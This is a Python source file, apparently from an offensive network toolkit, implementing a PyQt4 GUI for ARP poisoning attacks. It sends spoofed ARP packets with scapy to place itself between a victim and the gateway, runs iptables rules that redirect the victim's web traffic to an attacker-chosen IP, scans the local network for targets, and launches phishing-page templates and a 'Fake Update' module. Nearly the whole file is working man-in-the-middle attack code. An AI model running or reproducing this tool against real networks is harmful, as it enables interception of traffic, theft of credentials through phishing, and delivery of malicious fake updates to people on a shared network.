#The MIT License (MIT)
#Copyright (c) 2015-2016 mh4x0f P0cL4bs Team
#Permission is hereby granted, free of charge, to any person obtaining a copy of
#this software and associated documentation files (the "Software"), to deal in
#the Software without restriction, including without limitation the rights to
#use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
#the Software, and to permit persons to whom the Software is furnished to do so,
#subject to the following conditions:
#The above copyright notice and this permission notice shall be included in all
#copies or substantial portions of the Software.
#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
#FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
#COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
#IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
#CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
from PyQt4.QtGui import *
from PyQt4.QtCore import *
from Core.Settings import frm_Settings
from Modules.ModuleUpdateFake import frm_update_attack
from Modules.ModuleTemplates import frm_template
from Modules.utils import ProcessThread,Refactor,ThreadScan
from os import popen,chdir,getcwd,getuid,devnull,system
from scapy.all import *
import threading
from urllib2 import urlopen,URLError
from re import search,compile
from multiprocessing import Process,Manager
from time import sleep
threadloading = {'template':[],'posion':[]}

class frm_Arp(QMainWindow):
    def __init__(self, parent=None):
        super(frm_Arp, self).__init__(parent)
        self.form_widget = frm_Arp_Poison(self)
        self.setCentralWidget(self.form_widget)



class ThreadAttackPosion(QThread):
    def __init__(self,victim,gateway,mac):
        QThread.__init__(self)
        self.victim = victim
        self.gateway = gateway
        self.mac = mac
        self.process = True

    def run(self):
        print 'Starting Thread:' + self.objectName()
        while self.process:
            arp = ARP(op=1,psrc=self.gateway,pdst=self.victim,hwdst=self.mac)
            send(arp,verbose=False)
            sleep(2)

    def stop(self):
        self.process = False
        print 'Stop thread:' + self.objectName()
        self.emit(SIGNAL('Activated( QString )'),'Ok')


class frm_Arp_Poison(QWidget):

    def __init__(self, parent=None):
        super(frm_Arp_Poison, self).__init__(parent)
        self.setWindowTitle('Arp Posion Attack ')
        self.setWindowIcon(QIcon('rsc/icon.ico'))
        self.Main = QVBoxLayout()
        self.owd = getcwd()
        self.control = False
        self.interfaces = Refactor.get_interfaces()
        self.configure = frm_Settings()
        self.loadtheme(self.configure.XmlThemeSelected())
        self.module_network = Refactor
        self.data = {'IPaddress':[], 'Hostname':[], 'MacAddress':[]}
        self.ThreadDirc = {'Arp_posion':[]}
        global threadloading
        self.GUI()

    def closeEvent(self, event):
        if (len(self.ThreadDirc['Arp_posion']) != 0) or len(threadloading['template']) !=0:
            reply = QMessageBox.question(self, 'About Exit','Are you sure to close ArpPosion?', QMessageBox.Yes |
                QMessageBox.No, QMessageBox.No)
            if reply == QMessageBox.Yes:
                event.accept()
                if getuid() == 0:
                    try:
                        for i in self.ThreadDirc['Arp_posion']:
                            i.stop(),i.join()
                        for i in threadloading['template']:
                            i.stop(),i.join()
                            threadloading['template'] = []
                    except:pass
                    self.deleteLater()
                else:
                    pass
            else:
                event.ignore()

    def loadtheme(self,theme):
        sshFile=("Core/%s.qss"%(theme))
        with open(sshFile,"r") as fh:
            self.setStyleSheet(fh.read())

    def GUI(self):
        self.form =QFormLayout()
        self.movie = QMovie('rsc/loading2.gif', QByteArray(), self)
        size = self.movie.scaledSize()
        self.setGeometry(200, 200, size.width(), size.height())
        self.movie_screen = QLabel()
        self.movie_screen.setFixedHeight(200)
        self.movie_screen.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
        self.movie_screen.setAlignment(Qt.AlignCenter)
        self.movie.setCacheMode(QMovie.CacheAll)
        self.movie.setSpeed(100)
        self.movie_screen.setMovie(self.movie)
        self.movie_screen.setDisabled(False)

        self.movie.start()
        self.tables = QTableWidget(5,3)
        self.tables.setRowCount(100)
        self.tables.setFixedHeight(200)
        self.tables.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.tables.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.tables.clicked.connect(self.list_clicked_scan)
        self.tables.resizeColumnsToContents()
        self.tables.resizeRowsToContents()
        self.tables.horizontalHeader().resizeSection(1,120)
        self.tables.horizontalHeader().resizeSection(0,145)
        self.tables.horizontalHeader().resizeSection(2,158)
        self.tables.verticalHeader().setVisible(False)
        Headers = []
        for key in reversed(self.data.keys()):
            Headers.append(key)
        self.tables.setHorizontalHeaderLabels(Headers)

        self.txt_target = QLineEdit(self)
        self.txt_gateway = QLineEdit(self)
        self.txt_redirect = QLineEdit(self)
        self.txt_mac = QLineEdit(self)
        self.ip_range = QLineEdit(self)
        self.txt_status_scan = QLabel('')
        self.txt_statusarp = QLabel('')
        self.txt_status_phishing = QLabel('')

        self.StatusMonitor(False,'stas_scan')
        self.StatusMonitor(False,'stas_arp')
        self.StatusMonitor(False,'stas_phishing')
        scan_range = self.configure.xmlSettings('scan','rangeIP',None,False)
        self.ip_range.setText(scan_range)

        self.btn_start_scanner = QPushButton('Scan')
        self.btn_stop_scanner = QPushButton('Stop')
        self.btn_Attack_Posion = QPushButton('Start Attack')
        self.btn_Stop_Posion = QPushButton('Stop Attack')
        self.btn_server = QPushButton('Templates')
        self.btn_windows_update = QPushButton('Fake Update')
        self.btn_server.setFixedHeight(22)
        self.btn_stop_scanner.setFixedWidth(100)
        self.btn_start_scanner.setFixedWidth(100)
        self.btn_start_scanner.setFixedHeight(22)
        self.btn_stop_scanner.setFixedHeight(22)
        self.btn_windows_update.setFixedHeight(22)

        self.btn_start_scanner.clicked.connect(self.Start_scan)
        self.btn_stop_scanner.clicked.connect(self.Stop_scan)
        self.btn_Attack_Posion.clicked.connect(self.Start_Attack)
        self.btn_Stop_Posion.clicked.connect(self.kill_attack)
        self.btn_server.clicked.connect(self.show_template_dialog)
        self.btn_windows_update.clicked.connect(self.show_frm_fake)

        #icons
        self.btn_start_scanner.setIcon(QIcon('rsc/network.png'))
        self.btn_Attack_Posion.setIcon(QIcon('rsc/start.png'))
        self.btn_Stop_Posion.setIcon(QIcon('rsc/Stop.png'))
        self.btn_stop_scanner.setIcon(QIcon('rsc/network_off.png'))
        self.btn_server.setIcon(QIcon('rsc/page.png'))
        self.btn_windows_update.setIcon(QIcon('rsc/winUp.png'))

        self.grid0 = QGridLayout()
        self.grid0.minimumSize()
        self.grid0.addWidget(QLabel('ArpPosion:'),0,2)
        self.grid0.addWidget(QLabel('Phishing:'),0,4)
        self.grid0.addWidget(QLabel('Scanner:'),0,0)
        self.grid0.addWidget(self.txt_status_scan,0,1)
        self.grid0.addWidget(self.txt_statusarp,0,3)
        self.grid0.addWidget(self.txt_status_phishing,0,5)


        # grid options
        self.grid1 = QGridLayout()
        self.grid1.addWidget(self.btn_start_scanner,0,0)
        self.grid1.addWidget(self.btn_stop_scanner,0,1)
        self.grid1.addWidget(self.btn_server,0,2)
        self.grid1.addWidget(self.btn_windows_update, 0,3)

        #btn
        self.grid2 = QGridLayout()
        self.grid2.addWidget(self.btn_Attack_Posion,1,0)
        self.grid2.addWidget(self.btn_Stop_Posion,1,5)

        x  = self.interfaces
        if x['gateway'] != None:
            self.txt_gateway.setText(x['gateway'])
            self.txt_redirect.setText(x['IPaddress'])
            self.txt_mac.setText(Refactor.getHwAddr(x['activated']))

        self.form0  = QGridLayout()
        self.form0.addWidget(self.movie_screen,0,0)
        self.form0.addWidget(self.tables,0,0)
        self.form.addRow(self.form0)
        self.form.addRow(self.grid1)
        self.form.addRow('Target:', self.txt_target)
        self.form.addRow('Gateway:', self.txt_gateway)
        self.form.addRow('MAC address:', self.txt_mac)
        self.form.addRow('Redirect IP:', self.txt_redirect)
        self.form.addRow('IP ranger Scan:',self.ip_range)
        self.form.addRow(self.grid0)
        self.form.addRow(self.grid2)
        self.Main.addLayout(self.form)
        self.setLayout(self.Main)

    def thread_scan_reveice(self,info_ip):
        self.StatusMonitor(False,'stas_scan')
        self.movie_screen.setDisabled(False)
        self.tables.setVisible(True)
        data = info_ip.split('|')
        Headers = []
        self.data['IPaddress'].append(data[0])
        self.data['MacAddress'].append(data[1])
        self.data['Hostname'].append(data[2])
        for n, key in enumerate(reversed(self.data.keys())):
            Headers.append(key)
            for m, item in enumerate(self.data[key]):
                item = QTableWidgetItem(item)
                item.setTextAlignment(Qt.AlignVCenter | Qt.AlignCenter)
                self.tables.setItem(m, n, item)
        Headers = []
        for key in reversed(self.data.keys()):
            Headers.append(key)
        self.tables.setHorizontalHeaderLabels(Headers)


    def show_frm_fake(self):
        self.n = frm_update_attack()
        self.n.setGeometry(QRect(100, 100, 450, 300))
        self.n.show()

    def emit_template(self,log):
        if log == 'started':
            self.StatusMonitor(True,'stas_phishing')

    def show_template_dialog(self):
        self.Ftemplates = frm_template()
        self.connect(self.Ftemplates,SIGNAL('Activated ( QString ) '), self.emit_template)
        self.Ftemplates.setWindowTitle('Templates Phishing Attack')
        self.Ftemplates.txt_redirect.setText(self.txt_redirect.text())
        self.Ftemplates.show()

    def kill_attack(self):
        for i in self.ThreadDirc['Arp_posion']:
            i.stop()
        for i in threadloading['template']:
            i.stop(),i.join()
            threadloading['template'] = []
        try:
            self.Ftemplates.killThread()
        except:pass
        chdir(self.owd)
        self.StatusMonitor(False,'stas_arp')
        self.StatusMonitor(False,'stas_phishing')
        self.conf_attack(False)
        Refactor.set_ip_forward(0)

    @pyqtSlot(QModelIndex)
    def check_options(self,index):
        if self.check_face.isChecked():
            self.check_route.setChecked(False)
            self.check_gmail.setChecked(False)

        elif self.check_gmail.isChecked():
            self.check_face.setChecked(False)
            self.check_route.setChecked(False)
        else:
            self.check_face.setChecked(False)
            self.check_gmail.setChecked(False)

    def StopArpAttack(self,data):
        self.StatusMonitor(False,'stas_arp')
    def Start_Attack(self):
        if  (len(self.txt_target.text()) and len(self.txt_mac.text()) and len(self.txt_gateway.text())) == 0:
            QMessageBox.information(self, 'Error Arp Attacker', 'you need set the input correctly')
        else:
            chdir(self.owd)
            if (len(self.txt_target.text()) and len(self.txt_gateway.text())) and len(self.txt_mac.text()) != 0:
                if len(self.txt_redirect.text()) != 0:
                    self.StatusMonitor(True,'stas_arp')
                    Refactor.set_ip_forward(1)
                    self.conf_attack(True)
                    thr = ThreadAttackPosion(str(self.txt_target.text()),
                                             str(self.txt_gateway.text()),
                                             str(self.txt_mac.text()))
                    self.connect(thr,SIGNAL('Activated ( QString ) '), self.StopArpAttack)
                    thr.setObjectName('Arp Posion')
                    self.ThreadDirc['Arp_posion'].append(thr)
                    thr.start()

    def conf_attack(self,bool_conf):
        if bool_conf:
            self.ip = self.txt_redirect.text()
            if len(self.ip) != 0:
                iptables = [
                        'iptables -t nat --flush',
                        'iptables -A FORWARD --in-interface '+str(self.txt_gateway.text())+' -j ACCEPT',
                        'iptables -t nat --append POSTROUTING --out-interface ' +self.interfaces['activated'] +' -j MASQUERADE',
                        'iptables -t nat -A PREROUTING -p tcp --dport 80 --jump DNAT --to-destination '+self.ip
                            ]
                for i in iptables:
                    try:system(i)
                    except:pass
            else:
                QMessageBox.information(self,'Error Redirect IP','Redirect IP not found')
        else:
            nano = [
                'iptables --flush',
                'iptables --table nat --flush' ,\
                'iptables --delete-chain', 'iptables --table nat --delete-chain'
                    ]
            for delete in nano: popen(delete)

    def Start_scan(self):
        self.StatusMonitor(True,'stas_scan')
        threadscan_check = self.configure.xmlSettings('advanced','Function_scan',None,False)
        self.tables.clear()
        self.data = {'IPaddress':[], 'Hostname':[], 'MacAddress':[]}
        if threadscan_check == 'Nmap':
            try:
                from nmap import PortScanner
            except ImportError:
                QMessageBox.information(self,'Error Nmap','The modules python-nmap not installed')
                return
            if  self.txt_gateway.text() != '':
                self.movie_screen.setDisabled(True)
                self.tables.setVisible(False)
                config_gateway = str(self.txt_gateway.text())
                scan = ''
                config_gateway = config_gateway.split('.')
                del config_gateway[-1]
                for i in config_gateway:
                    scan += str(i) + '.'
                self.ThreadScanner = ThreadScan(scan + '0/24')
                self.connect(self.ThreadScanner,SIGNAL('Activated ( QString ) '), self.thread_scan_reveice)
                self.StatusMonitor(True,'stas_scan')
                self.ThreadScanner.start()
            else:
                QMessageBox.information(self,'Error in gateway','gateway not found.')

        elif threadscan_check == 'Ping':
            if self.txt_gateway.text() != '':
                config = str(self.txt_gateway.text())
                t = threading.Thread(target=self.scanner_network,args=(config,))
                t.daemon = True
                t.start(),t.join()
                self.StatusMonitor(False,'stas_scan')
            else:
                QMessageBox.information(self,'Error in gateway','gateway not found.')
        else:
            QMessageBox.information(self,'Error on select thread Scan','thread scan not selected.')

    def working(self,ip,lista):
        with open(devnull, 'wb') as limbo:
            result=subprocess.Popen(['ping', '-c', '1', '-n', '-W', '1', ip],
            stdout=limbo, stderr=limbo).wait()
            if not result:
                print('online',ip)
                lista[ip] = ip + '|' + self.module_network.get_mac(ip)

    def scanner_network(self,gateway):
        scan = ''
        config_gateway = gateway.split('.')
        del config_gateway[-1]
        for i in config_gateway:
            scan += str(i) + '.'
        gateway = scan
        ranger = str(self.ip_range.text()).split('-')
        jobs = []
        manager = Manager()
        on_ips = manager.dict()
        for n in xrange(int(ranger[0]),int(ranger[1])):
            ip='%s{0}'.format(n)%(gateway)
            p = Process(target=self.working,args=(ip,on_ips))
            jobs.append(p)
            p.start()
        for i in jobs: i.join()
        for i in on_ips.values():
            Headers = []
            n = i.split('|')
            self.data['IPaddress'].append(n[0])
            self.data['MacAddress'].append(n[1])
            self.data['Hostname'].append('<unknown>')
            for n, key in enumerate(reversed(self.data.keys())):
                Headers.append(key)
                for m, item in enumerate(self.data[key]):
                    item = QTableWidgetItem(item)
                    item.setTextAlignment(Qt.AlignVCenter | Qt.AlignCenter)
                    self.tables.setItem(m, n, item)
        Headers = []
        for key in reversed(self.data.keys()):
            Headers.append(key)
        self.tables.setHorizontalHeaderLabels(Headers)

    def Stop_scan(self):
        self.ThreadScanner.terminate()
        self.StatusMonitor(False,'stas_scan')
        Headers = []
        for key in reversed(self.data.keys()):
            Headers.append(key)
        self.tables.setHorizontalHeaderLabels(Headers)
        self.tables.setVisible(True)

    def StatusMonitor(self,bool,wid):
        if bool and wid == 'stas_scan':
            self.txt_status_scan.setText('[ ON ]')
            self.txt_status_scan.setStyleSheet('QLabel {  color : green; }')
        elif not bool and wid == 'stas_scan':
            self.txt_status_scan.setText('[ OFF ]')
            self.txt_status_scan.setStyleSheet('QLabel {  color : red; }')
        elif bool and wid == 'stas_arp':
            self.txt_statusarp.setText('[ ON ]')
            self.txt_statusarp.setStyleSheet('QLabel {  color : green; }')
        elif not bool and wid == 'stas_arp':
            self.txt_statusarp.setText('[ OFF ]')
            self.txt_statusarp.setStyleSheet('QLabel {  color : red; }')
        elif bool and wid == 'stas_phishing':
            self.txt_status_phishing.setText('[ ON ]')
            self.txt_status_phishing.setStyleSheet('QLabel {  color : green; }')
        elif not bool and wid == 'stas_phishing':
            self.txt_status_phishing.setText('[ OFF ]')
            self.txt_status_phishing.setStyleSheet('QLabel {  color : red; }')


    @pyqtSlot(QModelIndex)
    def list_clicked_scan(self, index):
        item = self.tables.selectedItems()
        if item != []:
            self.txt_target.setText(item[0].text())
        else:
            self.txt_target.clear()
